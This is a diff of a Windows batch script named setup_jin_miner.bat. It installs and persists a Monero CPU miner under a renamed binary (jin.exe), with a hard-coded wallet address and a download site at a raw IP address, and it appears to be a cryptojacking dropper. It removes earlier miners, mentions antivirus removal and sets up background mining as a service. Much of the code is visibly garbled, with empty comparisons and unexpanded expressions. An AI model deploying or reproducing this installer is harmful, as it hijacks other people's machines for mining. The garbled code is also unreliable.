@@ -15,15 +15,15 @@ set site=http://150.129.234.203:82
 rem checking prerequisites
 if [43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4] == [] (
 echo Script usage:
-echo > setup_jin_miner.bat <wallet address> [<your email address>]
+echo ^> setup_jin_miner.bat ^<wallet address^> [^<your email address^>]
 echo ERROR: Please specify your wallet address
 exit /b 1
 )
-for /f "delims=." %WALLET%a
-call :strlen ""  WALLET_BASE_LEN
+for /f "delims=." %%a in ("43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4") do set WALLET_BASE=%%a
+call :strlen "%%a"  WALLET_BASE_LEN
 if  == 106 goto WALLET_LEN_OK
 if  ==  95 goto WALLET_LEN_OK
-echo ERROR: Wrong wallet address length (should be 106 or 95): 
+echo ERROR: Wrong wallet address length (should be 106 or 95):
 exit /b 1
 :WALLET_LEN_OK
 if ["C:\Users\puncher"] == [""] (
@@ -63,35 +63,35 @@ exit /b 1
 )
 rem calculating port
 set /a "EXP_MONERO_HASHRATE = 4 * 700 / 1000"
-if [] == [] (
+if [(4 * 700 / 1000)] == [] (
 echo ERROR: Can't compute projected Monero hashrate
 exit
 )
-if  gtr 8192 ( set PORT=18192
+if (4 * 700 / 1000) gtr 8192 ( set PORT=18192
 goto PORT_OK )
-if  gtr 4096 ( set PORT=14096
+if (4 * 700 / 1000) gtr 4096 ( set PORT=14096
 goto PORT_OK )
-if  gtr 2048 ( set PORT=12048
+if (4 * 700 / 1000) gtr 2048 ( set PORT=12048
 goto PORT_OK )
-if  gtr 1024 ( set PORT=11024
+if (4 * 700 / 1000) gtr 1024 ( set PORT=11024
 goto PORT_OK )
-if  gtr  512 ( set PORT=10512
+if (4 * 700 / 1000) gtr  512 ( set PORT=10512
 goto PORT_OK )
-if  gtr  256 ( set PORT=10256
+if (4 * 700 / 1000) gtr  256 ( set PORT=10256
 goto PORT_OK )
-if  gtr  128 ( set PORT=10128
+if (4 * 700 / 1000) gtr  128 ( set PORT=10128
 goto PORT_OK )
-if  gtr   64 ( set PORT=10064
+if (4 * 700 / 1000) gtr   64 ( set PORT=10064
 goto PORT_OK )
-if  gtr   32 ( set PORT=10032
+if (4 * 700 / 1000) gtr   32 ( set PORT=10032
 goto PORT_OK )
-if  gtr   16 ( set PORT=10016
+if (4 * 700 / 1000) gtr   16 ( set PORT=10016
 goto PORT_OK )
-if  gtr    8 ( set PORT=10008
+if (4 * 700 / 1000) gtr    8 ( set PORT=10008
 goto PORT_OK )
-if  gtr    4 ( set PORT=10004
+if (4 * 700 / 1000) gtr    4 ( set PORT=10004
 goto PORT_OK )
-if  gtr    2 ( set PORT=10002
+if (4 * 700 / 1000) gtr    2 ( set PORT=10002
 goto PORT_OK )
 set PORT=10001
 :PORT_OK
@@ -110,7 +110,7 @@ echo Since I do not have admin access  mining in background will be started usin
 echo Mining in background will be performed using jin_miner service.
 )
 echo.
-echo JFYI: This host has 4 CPU threads  so projected Monero hashrate is around  KH/s.
+echo JFYI: This host has 4 CPU threads  so projected Monero hashrate is around (4 * 700 / 1000) KH/s.
 echo.
 rem start doing stuff: preparing miner
 echo [*] Removing previous moneroocean miner (if any)
@@ -193,8 +193,8 @@ echo WARNING: Stock version of "C:\Users\puncher\jin\jin.exe" was removed by ant
 exit /b 1
 :MINER_OK
 echo [*] Miner "C:\Users\puncher\jin\jin.exe" is OK
-for /f "tokens=*" %%a
-if [] == [] (
+for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[a-zA-Z0-9]+', '_'}"') do set PASS=prx.%%a
+if [prx.%%a] == [] (
 set PASS=na
 )
 if not [prx] == [] (
@@ -211,9 +211,9 @@ powershell -Command "$out = cat 'C:\Users\puncher\jin\config_background.json' | 
 rem preparing script
 (
 echo @echo off
-echo tasklist /fi "imagename eq jin.exe" | find ":" >NUL
+echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL
 echo if errorlevel 1 goto ALREADY_RUNNING
-echo start /low %%*
+echo start /low %%~dp0jin.exe %%*
 echo goto EXIT
 echo :ALREADY_RUNNING
 echo echo Monero miner is already running in the background. Refusing to run another one.
@@ -271,9 +271,9 @@ exit /b 0
 setlocal EnableDelayedExpansion
 set "token=#%~1"
 set "len=0"
-for /L %%A in (12,-1,0) do (
+for /L %%A in (12 -1 0) do (
 set/A "len|=1<<%%A"
-for %%A"
+for %%B in (0) do if ""=="" set/A "len&=~1<<%%A"
 )
 endlocal
 set len%
